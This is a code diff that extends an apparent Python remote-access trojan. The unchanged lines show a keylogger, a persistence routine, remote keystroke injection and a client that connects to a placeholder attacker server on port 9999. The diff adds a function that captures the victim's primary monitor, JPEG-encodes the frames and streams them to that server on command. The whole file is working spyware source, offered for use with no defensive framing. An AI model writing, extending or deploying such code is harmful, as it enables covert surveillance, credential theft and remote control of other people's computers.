@@ -8,11 +8,19 @@ import pyautogui
 from io import BytesIO
 from pynput import keyboard
 import platform
+import cv2
+import mss
+import numpy as np
+import time
 
 # Globals for keylogger
 keylog = []
 keylog_lock = threading.Lock()
 keylogger_running = False
+
+# Globals for streaming
+streaming_active = False
+streaming_lock = threading.Lock()
 
 def reliable_send(s, data):
     length = struct.pack('>I', len(data))
@@ -106,6 +114,34 @@ def add_persistence():
         # For Linux/macOS, add to cron or launch agents (not implemented here)
         pass
 
+def stream_desktop(s):
+    global streaming_active
+    with mss.mss() as sct:
+        while True:
+            with streaming_lock:
+                if not streaming_active:
+                    break
+
+            # Capture screen
+            sct_img = sct.grab(sct.monitors[1]) # Capture the primary monitor
+            img = np.array(sct_img)
+            img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR) # Convert to BGR for OpenCV compatibility
+
+            # Encode to JPEG
+            encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 70] # Quality 0-100
+            result, frame = cv2.imencode('.jpg', img, encode_param)
+            if not result:
+                continue
+
+            try:
+                reliable_send(s, frame.tobytes())
+            except socket.error as e:
+                print(f"Socket error during streaming: {e}")
+                with streaming_lock:
+                    streaming_active = False
+                break
+            time.sleep(0.05) # Adjust for desired frame rate (e.g. 0.1 for 10 FPS, 0.05 for 20 FPS)
+
 def client():
     server_ip = 'SERVER_IP'  # Replace with your server IP
     server_port = 9999
@@ -164,6 +200,21 @@ def client():
             text = command[5:]
             pyautogui.typewrite(text)
             reliable_send(s, b'Text typed')
+        elif command == 'stream_start':
+            with streaming_lock:
+                if not streaming_active:
+                    streaming_active = True
+                    threading.Thread(target=stream_desktop, args=(s,), daemon=True).start()
+                    reliable_send(s, b'Desktop streaming started')
+                else:
+                    reliable_send(s, b'Streaming already active')
+        elif command == 'stream_stop':
+            with streaming_lock:
+                if streaming_active:
+                    streaming_active = False
+                    reliable_send(s, b'Desktop streaming stopped')
+                else:
+                    reliable_send(s, b'Streaming not active')
         else:
             reliable_send(s, b'Unknown command')
 
